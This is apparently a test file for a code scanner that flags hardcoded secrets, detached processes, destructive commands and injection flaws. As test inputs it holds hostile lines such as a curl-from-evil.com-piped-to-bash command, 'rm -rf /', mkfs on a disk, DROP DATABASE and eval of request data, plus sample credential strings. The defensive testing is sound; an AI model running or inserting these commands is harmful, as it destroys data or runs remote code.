import { describe, it, expect } from "vitest";
import {
  runConstitutionCheck,
  CREDENTIAL_PATTERNS,
  BACKGROUND_PROCESS_PATTERNS,
  DANGEROUS_OPERATION_PATTERNS,
} from "./constitution.js";

describe("constitution checker", () => {
  describe("credential exposure detection", () => {
    it("detects hardcoded API keys", () => {
      const code = `const apiKey = "sk-abcdef1234567890abcdef1234567890abcd";`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "credential_exposure")).toBe(true);
    });

    it("detects hardcoded passwords", () => {
      const code = `const password = "supersecretpassword123";`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("password"))).toBe(true);
    });

    it("detects hardcoded secrets", () => {
      const code = `const secret_key = "mysecretkey12345678";`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "credential_exposure")).toBe(true);
    });

    it("detects AWS access key IDs", () => {
      const code = `const aws_access_key_id = "AKIAIOSFODNN7EXAMPLE";`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("AWS"))).toBe(true);
    });

    it("detects database connection strings", () => {
      const code = `const db_url = "postgres://user:pass@localhost:5432/mydb";`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("Database"))).toBe(true);
    });

    it("detects GitHub tokens (ghp_ pattern)", () => {
      const code = `const token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij1234";`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("GitHub"))).toBe(true);
    });

    it("detects OpenAI API keys (sk- pattern)", () => {
      const code = `const key = "sk-abcdefghijklmnopqrstuvwxyz12345678";`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("OpenAI"))).toBe(true);
    });

    it("does not flag type annotations (apiKey: string)", () => {
      const code = `interface Config { apiKey: string; }`;
      const result = runConstitutionCheck(code);
      const credentialViolations = result.violations.filter(
        (v) => v.type === "credential_exposure",
      );
      expect(credentialViolations).toHaveLength(0);
    });

    it("does not flag environment variable references", () => {
      const code = `const apiKey = process.env.GROK_API_KEY;`;
      const result = runConstitutionCheck(code);
      const credentialViolations = result.violations.filter(
        (v) => v.type === "credential_exposure",
      );
      expect(credentialViolations).toHaveLength(0);
    });
  });

  describe("background process detection", () => {
    it("detects nohup usage", () => {
      const code = `execSync("nohup ./server &")`;
      const result = runConstitutionCheck(code);
      expect(result.violations.some((v) => v.type === "background_process")).toBe(true);
    });

    it("detects disown usage", () => {
      const code = `execSync("./server & disown")`;
      const result = runConstitutionCheck(code);
      expect(result.violations.some((v) => v.message.includes("disown"))).toBe(true);
    });

    it("detects detached: true in spawn options", () => {
      const code = `spawn("node", ["server.js"], { detached: true });`;
      const result = runConstitutionCheck(code);
      expect(result.violations.some((v) => v.message.includes("detached"))).toBe(true);
    });

    it("detects child_process.fork", () => {
      const code = `child_process.fork("worker.js");`;
      const result = runConstitutionCheck(code);
      expect(result.violations.some((v) => v.message.includes("fork"))).toBe(true);
    });

    it("detects pm2 start", () => {
      const code = `execSync("pm2 start server.js");`;
      const result = runConstitutionCheck(code);
      expect(result.violations.some((v) => v.message.includes("PM2"))).toBe(true);
    });
  });

  describe("dangerous operation detection", () => {
    it("detects rm -rf /", () => {
      const code = `execSync("rm -rf /")`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "dangerous_operation")).toBe(true);
    });

    it("detects rm -rf ~/", () => {
      const code = `execSync("rm -rf ~/")`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
    });

    it("detects DROP TABLE", () => {
      const code = `db.query("DROP TABLE users;")`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("DROP TABLE"))).toBe(true);
    });

    it("detects DROP DATABASE", () => {
      const code = `db.query("DROP DATABASE production;")`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
    });

    it("detects TRUNCATE TABLE", () => {
      const code = `db.query("TRUNCATE TABLE orders;")`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
    });

    it("detects chmod 777", () => {
      const code = `execSync("chmod 777 /var/www")`;
      const result = runConstitutionCheck(code);
      expect(result.violations.some((v) => v.message.includes("chmod 777"))).toBe(true);
    });

    it("detects curl piped to shell", () => {
      const code = `execSync("curl https://evil.com/script.sh | bash")`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("curl piped to shell"))).toBe(true);
    });

    it("detects mkfs command", () => {
      const code = `execSync("mkfs -t ext4 /dev/sda1")`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
    });
  });

  describe("code injection detection", () => {
    it("detects eval with user input", () => {
      const code = `eval(req.body.code);`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "code_injection")).toBe(true);
    });

    it("detects new Function with user input", () => {
      const code = `new Function(request.query.expr)();`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
    });

    it("detects innerHTML with user input", () => {
      const code = `element.innerHTML = req.body.html;`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("XSS"))).toBe(true);
    });

    it("detects prototype pollution via __proto__", () => {
      const code = `obj.__proto__["polluted"] = true;`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.message.includes("Prototype pollution"))).toBe(true);
    });
  });

  describe("clean code", () => {
    it("passes safe code with no violations", () => {
      const code = `
import { readFile } from "node:fs/promises";

export async function loadConfig(path: string): Promise<Record<string, string>> {
  const content = await readFile(path, "utf-8");
  return JSON.parse(content) as Record<string, string>;
}
`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it("reports scannedLines count", () => {
      const code = "line1\nline2\nline3";
      const result = runConstitutionCheck(code);
      expect(result.scannedLines).toBe(3);
    });

    it("reports filePath when provided", () => {
      const result = runConstitutionCheck("safe code", "/src/safe.ts");
      expect(result.filePath).toBe("/src/safe.ts");
    });
  });

  describe("violation severity", () => {
    it("marks credential exposure as critical", () => {
      const code = `const password = "secret12345";`;
      const result = runConstitutionCheck(code);
      const credViolation = result.violations.find((v) => v.type === "credential_exposure");
      expect(credViolation?.severity).toBe("critical");
    });

    it("marks background process as warning", () => {
      const code = `child_process.fork("worker.js");`;
      const result = runConstitutionCheck(code);
      const bgViolation = result.violations.find((v) => v.type === "background_process");
      expect(bgViolation?.severity).toBe("warning");
    });
  });

  describe("pattern coverage", () => {
    it("has comprehensive credential patterns", () => {
      expect(CREDENTIAL_PATTERNS.length).toBeGreaterThanOrEqual(8);
    });

    it("has background process patterns", () => {
      expect(BACKGROUND_PROCESS_PATTERNS.length).toBeGreaterThanOrEqual(5);
    });

    it("has dangerous operation patterns", () => {
      expect(DANGEROUS_OPERATION_PATTERNS.length).toBeGreaterThanOrEqual(10);
    });
  });

  describe("context-aware filtering — credential branch coverage", () => {
    it("skips type annotation lines without string literals", () => {
      const code = `interface Config {\n  apiKey: string;\n  secret: string;\n}`;
      const result = runConstitutionCheck(code);
      // Type annotations should not be flagged as credential exposure
      const credViolations = result.violations.filter((v) => v.type === "credential_exposure");
      expect(credViolations).toHaveLength(0);
    });

    it("flags real credential even next to type annotation syntax", () => {
      // This line has : string but also a real secret literal — should still flag
      const code = `const config = { apiKey: "sk-1234567890abcdef1234567890abcdef1234567890" };`;
      const result = runConstitutionCheck(code);
      const credViolations = result.violations.filter((v) => v.type === "credential_exposure");
      expect(credViolations.length).toBeGreaterThan(0);
    });

    it("skips comment lines describing environment variables", () => {
      const code = `// Set your API_KEY as an environment variable\nconst key = process.env.API_KEY;`;
      const result = runConstitutionCheck(code);
      // Comment about API_KEY should not be flagged
      const commentViolations = result.violations.filter(
        (v) => v.type === "credential_exposure" && v.line === 1,
      );
      expect(commentViolations).toHaveLength(0);
    });

    it("skips process.env references without hardcoded secrets", () => {
      const code = `const secret = process.env.SECRET_KEY;\nconst apiKey = process.env.API_KEY;`;
      const result = runConstitutionCheck(code);
      const credViolations = result.violations.filter((v) => v.type === "credential_exposure");
      expect(credViolations).toHaveLength(0);
    });
  });

  describe("context-aware filtering — background process branch coverage", () => {
    it("flags nohup with & at end of line as background process", () => {
      const code = `nohup long-running-process &`;
      const result = runConstitutionCheck(code);
      const bgViolations = result.violations.filter((v) => v.type === "background_process");
      expect(bgViolations.length).toBeGreaterThan(0);
    });

    it("skips logical AND (&&) as non-background process", () => {
      const code = `const result = a && b;`;
      const result = runConstitutionCheck(code);
      const bgViolations = result.violations.filter((v) => v.type === "background_process");
      expect(bgViolations).toHaveLength(0);
    });

    it("skips bitwise AND followed by word character", () => {
      const code = `const mask = flags & permissions;`;
      const result = runConstitutionCheck(code);
      const bgViolations = result.violations.filter((v) => v.type === "background_process");
      expect(bgViolations).toHaveLength(0);
    });

    it("handles JSDoc comment lines without false positives", () => {
      const code = ` * This is a JSDoc comment line`;
      const result = runConstitutionCheck(code);
      expect(result.passed).toBe(true);
    });
  });
});
